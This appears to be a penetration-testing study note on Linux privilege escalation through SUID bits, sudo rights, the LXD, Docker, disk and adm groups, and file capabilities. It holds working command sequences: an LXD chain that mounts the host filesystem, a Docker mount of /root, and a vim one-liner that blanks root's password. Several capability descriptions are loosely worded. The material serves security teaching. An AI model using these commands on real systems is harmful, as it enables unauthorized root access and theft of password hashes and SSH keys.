# Permission-Based Priv Esc

- Special Permissions
- Sudo Right Abuse
- Privileged Groups
- Capabilities

## Special Permissions

The Set User ID upon Execution (**setuid**). The setuid bit appears as an s.
````
$ find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
````
The Set-Group-ID (**setgid**)
````
$ find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
````

**Find Writable Directories**
````
$ find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
````
**Find Writable Files**
````
$ find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
````

https://gtfobins.github.io/

## Sudo Rights Abuse

When the sudo command is issued, the system will check if the user issuing the command has the appropriate rights, as configured in /etc/sudoers. When landing on a system, we should always check to see if the current user has any sudo privileges by typing sudo -l. Sometimes we will need to know the user's password to list their sudo rights, but any rights entries with the NOPASSWD option can be seen without entering a password.
````
$ sudo -l

Matching Defaults entries for sysadm on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User sysadm may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/tcpdump
````
For example, if the sudoers file is edited to grant a user the right to run a command such as tcpdump per the following entry in the sudoers file: (ALL) NOPASSWD: /usr/sbin/tcpdump an attacker could leverage this to take advantage of a the postrotate-command option.

https://gtfobins.github.io/

## Privileged Groups

**LXC / LXD**

LXD is similar to Docker and is Ubuntu's container manager. Upon installation, all users are added to the LXD group. Membership of this group can be used to escalate privileges by creating an LXD container, making it privileged, and then accessing the host file system at /mnt/root. Let's confirm group membership and use these rights to escalate to root.
````
$ id
uid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd)
````

Exploitation
````
$ unzip alpine.zip
$ lxd init
$ lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
$ lxc init alpine r00t -c security.privileged=true
$ lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
$ lxc start r00t
$ lxc exec r00t /bin/sh
````
Basically, we mount all the host's filesystems inside the /mnt/root container. From here we can read sensitive files such as /etc/shadow and obtain password hashes or gain access to SSH keys in order to connect to the host system as root, and more.

**Docker**
````
$ docker run -v /root:/mnt -it ubuntu
````
This command creates a new Docker instance with the /root directory on the host file system mounted as a volume. Once the container is started we are able to browse the mounted directory and retrieve or add SSH keys for the root user. This could be done for other directories such as /etc which could be used to retrieve the contents of the /etc/shadow file for offline password cracking or adding a privileged user.

**Disk**

Users within the disk group have full access to any devices contained within /dev, such as /dev/sda1, which is typically the main device used by the operating system. An attacker with these privileges can use debugfs to access the entire file system with root level privileges. As with the Docker group example, this could be leveraged to retrieve SSH keys, credentials or to add a user.

**ADM**

Members of the adm group are able to read all logs stored in /var/log. This does not directly grant root access, but could be leveraged to gather sensitive data stored in log files or enumerate user actions and running cron jobs.

## Capabilities

Linux capabilities are a security feature in the Linux operating system that allows specific privileges to be granted to processes, allowing them to perform specific actions that would otherwise be restricted. This allows for more fine-grained control over which processes have access to certain privileges, making it more secure than the traditional Unix model of granting privileges to users and groups.

| Capability              | Description |
|-------------------------|-------------|
| `cap_sys_admin`         | Allows to perform actions with administrative privileges, such as modifying system files or changing system settings. |
| `cap_sys_chroot`        | Allows to change the root directory for the current process, allowing it to access files and directories that would otherwise be inaccessible. |
| `cap_sys_ptrace`        | Allows to attach to and debug other processes, potentially allowing it to gain access to sensitive information or modify the behavior of other processes. |
| `cap_sys_nice`          | Allows to raise or lower the priority of processes, potentially allowing it to gain access to resources that would otherwise be restricted. |
| `cap_sys_time`          | Allows to modify the system clock, potentially allowing it to manipulate timestamps or cause other processes to behave in unexpected ways. |
| `cap_sys_resource`      | Allows to modify system resource limits, such as the maximum number of open file descriptors or the maximum amount of memory that can be allocated. |
| `cap_sys_module`        | Allows to load and unload kernel modules, potentially allowing it to modify the operating system's behavior or gain access to sensitive information. |
| `cap_net_bind_service`  | Allows to bind to network ports, potentially allowing it to gain access to sensitive information or perform unauthorized actions. |

Here are some examples of values that we can use with the setcap command, along with a brief description of what they do:

| Capability Values | Description |
|-------------------|-------------|
| `=`               | This value sets the specified capability for the executable, but does not grant any privileges. This can be useful if we want to clear a previously set capability for the executable. |
| `+ep`             | This value grants the effective and permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability. |
| `+ei`             | This value grants sufficient and inheritable privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows and child processes spawned by the executable to inherit the capability and perform the same actions. |
| `+p`              | This value grants the permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability. This can be useful if we want to grant the capability to the executable but prevent it from inheriting the capability or allowing child processes to inherit it. |

Several Linux capabilities can be used to escalate a user's privileges to root, including:

| Capability       | Description                                                                                                                      |
|------------------|----------------------------------------------------------------------------------------------------------------------------------|
| cap_setuid       | Allows a process to set its effective user ID, which can be used to gain the privileges of another user, including the root user. |
| cap_setgid       | Allows to set its effective group ID, which can be used to gain the privileges of another group, including the root group.        |
| cap_sys_admin    | This capability provides a broad range of administrative privileges, including the ability to perform many actions reserved for the root user, such as modifying system settings and mounting and unmounting file systems. |
| cap_dac_override | Allows bypassing of file read, write, and execute permission checks.                                                             |

**Enumerating Capabilities**
````
$ find / -type f -perm /u+s,g+s -exec getcap {} \; 2>/dev/null
$ find / -type f -exec getcap {} \; 2>/dev/null | grep -v "= $"
$ find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;

/usr/bin/vim.basic cap_dac_override=eip
````
**Exploitation**
````
$ echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
````
Now the root user has no password.
